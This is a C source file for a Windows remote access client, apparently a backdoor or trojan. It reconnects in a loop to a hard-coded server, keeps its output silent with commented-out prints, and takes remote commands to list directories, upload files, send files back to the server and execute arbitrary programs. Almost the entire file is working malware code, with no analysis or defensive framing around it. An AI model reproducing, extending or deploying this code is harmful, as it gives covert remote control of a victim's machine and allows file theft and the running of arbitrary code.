#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <unistd.h>
#include <stdbool.h>
#include <dirent.h>

#define SERVER_IP "127.0.0.1"
#define PORT 12345

#define MAX 200000

#define READY "*101"
#define DONE "*102" 
#define EXIT "*103"
#define OK "*104"

#define TRAVERSE_MODE "*201"
#define UPLOAD_FILE "*202"
#define DOWNLOAD_FILE "*203"
#define EXECUTE_FILE "*204"

#define ASK_FOR_FILENAME "*311"
#define ASK_FOR_CONTENT "*322"
#define ASK_FOR_DIRECTORY "*314"
#define ASK_FOR_COMMAND "*315"


#define FILE_NOT_FOUND "*401"
#define CANT_OPEN_FILE "*402"
#define DIRECTORY_NOT_FOUND "*403"
#define PATH_NOT_EXIST "*404"

#define SENDING_FILE_CONTENT "*511"

#define START_DOWNLOAD_PROTOCOL "*621"

#define MAX_ENTRIES 1000

SOCKET client_socket;
char response_buffer[MAX];
int rb;

int receive(char* dest, int size)
{
    rb = recv(client_socket, dest, size, 0);
    dest[rb] = '\0';
    if (rb <= 0) {
        //printf("Connection closed\n");
        return 0;
    }
    return 1;
}

bool pathExists(const char* path) {
    return access(path, F_OK) == 0;
}

char* listFilesAndDirectories(const char* path) {
    struct dirent *de;
    DIR *dr = opendir(path);

    if (dr == NULL) {
        //printf("Could not open directory: %s", path);
        return NULL;
    }

    char *result = malloc(1); // Start with an empty string
    result[0] = '\0';
    size_t result_len = 1; // Keep track of the length of the result string

    while ((de = readdir(dr)) != NULL) {
        const char *name = de->d_name;
        size_t name_len = strlen(name);

        // Ensure enough space in the result buffer
        result = realloc(result, result_len + name_len + 2); // +2 for colon and null terminator
        if (result == NULL) {
            //printf("Memory allocation error.\n");
            return NULL;
        }

        // Add a colon separator and the folder or file name
        strcat(result, ":");
        strcat(result, name);
        result_len += name_len + 1; // +1 for the colon
    }

    closedir(dr);

    return result;
}

int execute_file(){
    //ask for filename
    send(client_socket, ASK_FOR_FILENAME, strlen(ASK_FOR_FILENAME), 0);
    if(receive(response_buffer, sizeof(response_buffer)) == 0){
        return 0;
    }
    if (strncmp(response_buffer, EXIT, strlen(EXIT)) == 0)
    {
        send(client_socket, EXIT, strlen(EXIT), 0);
        return 1;
    }
    if(!pathExists(response_buffer)){
        send(client_socket, FILE_NOT_FOUND, strlen(FILE_NOT_FOUND), 0);
        return 1;
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcess(NULL, response_buffer, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    send(client_socket, DONE, strlen(DONE), 0);
    if(receive(response_buffer, sizeof(response_buffer)) == 0){
        return 0;
    }
    return 1;
}

int get_filename(){
    send(client_socket, ASK_FOR_FILENAME, strlen(ASK_FOR_FILENAME), 0);
    if(receive(response_buffer, sizeof(response_buffer)) == 0){
        return 0;
    }
    if (strncmp(response_buffer, EXIT, strlen(EXIT)) == 0)
    {
        send(client_socket, EXIT, strlen(EXIT), 0);
        return 1;
    }
    if(!pathExists(response_buffer)){
        send(client_socket, FILE_NOT_FOUND, strlen(FILE_NOT_FOUND), 0);
        return 1;
    }
    send(client_socket, DONE, strlen(DONE), 0);
    return 1;
}

int download_file(char* filename){ //client to server
    //send file content
    FILE* file = fopen(filename, "rb");
    if (file == NULL)
    {
        send(client_socket, CANT_OPEN_FILE, strlen(CANT_OPEN_FILE), 0);
        if(receive(response_buffer, sizeof(response_buffer)) == 0){
            return 0;
        }
        return 1;
    }
    
    send(client_socket, SENDING_FILE_CONTENT, strlen(SENDING_FILE_CONTENT), 0);
    if(receive(response_buffer, sizeof(response_buffer)) == 0){
        return 0;
    }
    if(strncmp(response_buffer, EXIT, strlen(EXIT)) == 0){
        return 1;
    }
    while (!feof(file))
    {
        int read_bytes = fread(response_buffer, 1, sizeof(response_buffer), file);
        send(client_socket, response_buffer, read_bytes, 0);
        if(receive(response_buffer, sizeof(response_buffer)) == 0){
            return 0;
        }
    }
    send(client_socket, DONE, strlen(DONE), 0);
    if(receive(response_buffer, sizeof(response_buffer)) == 0){
        return 0;
    }

}

int upload_file(){
    //ask for filename
    send(client_socket, ASK_FOR_FILENAME, strlen(ASK_FOR_FILENAME), 0);
    if(receive(response_buffer, sizeof(response_buffer)) == 0){
        return 0;
    }
    if(strncmp(response_buffer, EXIT, strlen(EXIT)) == 0){
        send(client_socket, EXIT, strlen(EXIT), 0);
        if(receive(response_buffer, sizeof(response_buffer)) == 0){
            return 0;
        }
        return 1;
    }
    char* filename = (char*)malloc(strlen(response_buffer) + 1);
    strcpy(filename, response_buffer);
    FILE* file;
    //ask for file content
    send(client_socket, ASK_FOR_CONTENT, strlen(ASK_FOR_CONTENT), 0);
    int a = 1;
    memset(response_buffer, 0, sizeof(response_buffer));
    while(1){
        int rb = recv(client_socket, response_buffer, sizeof(response_buffer), 0);
        if(strncmp(response_buffer, EXIT, strlen(EXIT)) == 0){
            send(client_socket, EXIT, strlen(EXIT), 0);
            if(receive(response_buffer, sizeof(response_buffer)) == 0){
                return 0;
            }
            filename == NULL?0:free(filename);
            return 1;
        }
        if(a == 1){
            file = fopen(filename, "wb");
            free(filename);
            filename = NULL;
        }
        //printf("Received %d in %d iteration\n", rb, a); 
        
        if(rb == 4){
            if(strncmp(response_buffer, DONE, strlen(DONE)) == 0){
                send(client_socket, DONE, strlen(DONE), 0);
                if(receive(response_buffer, sizeof(response_buffer)) == 0){
                    return 0;
                }
                fclose(file);
                return 1;
            }
        }
        fwrite(response_buffer,1,rb,file);
        send(client_socket, OK, strlen(OK), 0);
        a+=1;
    }

}

int traverse_mode(){
    //enter root directory
    char* current_directory = (char*)malloc(MAX);
    while(1){
        send(client_socket, ASK_FOR_DIRECTORY, strlen(ASK_FOR_DIRECTORY), 0);
        if(receive(response_buffer, sizeof(response_buffer)) == 0){
            return 0;
        }
        if(strncmp(response_buffer, EXIT, strlen(EXIT)) == 0){
            send(client_socket, EXIT, strlen(EXIT), 0);
            if(receive(response_buffer, sizeof(response_buffer)) == 0){
                return 0;
            }
            free(current_directory);
            return 1;
        }
        strcpy(current_directory, response_buffer);
        if(!pathExists(current_directory)){
            send(client_socket, DIRECTORY_NOT_FOUND, strlen(DIRECTORY_NOT_FOUND), 0);
            if(receive(response_buffer, sizeof(response_buffer)) == 0){
                return 0;
            }
            
            continue;
        }else{
            send(client_socket, DONE, strlen(DONE), 0);
            if(receive(response_buffer, sizeof(response_buffer)) == 0){
                return 0;
            }
            //printf("Entered %s\n", current_directory); //d
            break;
        }
        
    }
    //ask for command
    while(1){
        //printf("Current directory: %s\n", current_directory); //d
        send(client_socket, current_directory, strlen(current_directory), 0);
        if(receive(response_buffer, sizeof(response_buffer)) == 0){
            return 0;
        }
        send(client_socket,ASK_FOR_COMMAND, strlen(ASK_FOR_COMMAND), 0);
        if(receive(response_buffer, sizeof(response_buffer)) == 0){
            return 0;
        }
        //exit
        if(strncmp(response_buffer, "exit", strlen("exit")) == 0){
            send(client_socket, EXIT, strlen(EXIT), 0);
            if(receive(response_buffer, sizeof(response_buffer)) == 0){
                return 0;
            }
            free(current_directory);
            return 1;
        }
        //cd
        else if (strncmp(response_buffer, "cd", 2) == 0) {
            memmove(response_buffer, response_buffer + 3, strlen(response_buffer));
            //..
            if (strcmp(response_buffer, "..") == 0) {
                if(current_directory[strlen(current_directory) - 2] != ':'){
                    char* last_slash = strrchr(current_directory, '\\');
                    *last_slash = '\0';
                    last_slash = strrchr(current_directory, '\\');
                    *last_slash = '\0';
                    strcat(current_directory, "\\");

                }
                send(client_socket, DONE, strlen(DONE), 0);
                if(receive(response_buffer, sizeof(response_buffer)) == 0){
                    return 0;
                }
            }
            else if(response_buffer[0] != '.'){
                strcat(current_directory, response_buffer);
                strcat(current_directory, "\\");
                //check if path exist
                if (!pathExists(current_directory)) {
                    send(client_socket, PATH_NOT_EXIST, strlen(PATH_NOT_EXIST), 0);
                    char* last_slash = strrchr(current_directory, '\\');
                    *last_slash = '\0';
                    last_slash = strrchr(current_directory, '\\');
                    *last_slash = '\0';
                    strcat(current_directory, "\\");
                    if(receive(response_buffer, sizeof(response_buffer)) == 0){
                        return 0;
                    }
                    continue;
                }else{
                send(client_socket, DONE, strlen(DONE), 0);
                if(receive(response_buffer, sizeof(response_buffer)) == 0){
                    return 0;
                }
                }
            }
            
            
        }
        //dw
        else if (strncmp(response_buffer, "dw", 2) == 0) {
            memmove(response_buffer, response_buffer + 3, strlen(response_buffer));
            char* filePath = (char*)malloc(strlen(current_directory) + strlen(response_buffer) + 1);
            strcpy(filePath, current_directory);
            strcat(filePath, response_buffer);
            send(client_socket, START_DOWNLOAD_PROTOCOL, strlen(START_DOWNLOAD_PROTOCOL), 0);
            if(receive(response_buffer, sizeof(response_buffer)) == 0){
                return 0;
            }
            download_file(filePath);
            free(filePath);
        }
        //ls
        else if(strncmp(response_buffer, "ls", 2) == 0){
            char* result = listFilesAndDirectories(current_directory);
            send(client_socket, result, strlen(result), 0);
            //printf("Sent %s\n", result); //d
            free(result);
            if(receive(response_buffer, sizeof(response_buffer)) == 0){
                return 0;
            }
        }
        
    }
    free(current_directory);
}

int main() {
    //init
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            //fprintf(stderr, "WSAStartup failed\n");
            return 1;
        }

    while(1){
        struct sockaddr_in server_addr;
        //socket creation
        client_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (client_socket == INVALID_SOCKET) {
            //fprintf(stderr, "Socket creation failed\n");
            WSACleanup();
            return 1;
        }
        //server info
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
        server_addr.sin_port = htons(PORT);

        int connection_status = connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
        if(connection_status == SOCKET_ERROR){
            //printf("Connection failed\n");
            Sleep(300000);
            continue;
        }
        //1
        if(receive(response_buffer, sizeof(response_buffer)) == 0){
            continue;
        }
        else if(strncmp(response_buffer, READY, strlen(READY)) == 0){
            while(1){
                //printf("send ready\n");
                send(client_socket, READY, strlen(READY), 0);
                if(receive(response_buffer, sizeof(response_buffer)) == 0){
                    break;
                }
                else if(strncmp(response_buffer, TRAVERSE_MODE, strlen(TRAVERSE_MODE)) == 0){
                        if(traverse_mode()==0)
                            break;
                }
                else if(strncmp(response_buffer, UPLOAD_FILE, strlen(UPLOAD_FILE)) == 0){
                    if(upload_file() == 0)
                        break;                    
                }
                else if(strncmp(response_buffer, DOWNLOAD_FILE, strlen(DOWNLOAD_FILE)) == 0){
                    if(get_filename()){
                        download_file(response_buffer);
                    }
                    else
                        break;
                    
                }
                else if(strncmp(response_buffer, EXECUTE_FILE, strlen(EXECUTE_FILE)) == 0){
                    if(execute_file() == 0)
                        break;
                    
                }
                else if(strncmp(response_buffer, EXIT, strlen(EXIT)) == 0){
                    break;
                }
                else{
                    //printf("Unknown command\n");
                }
                
            }
        }
    }
}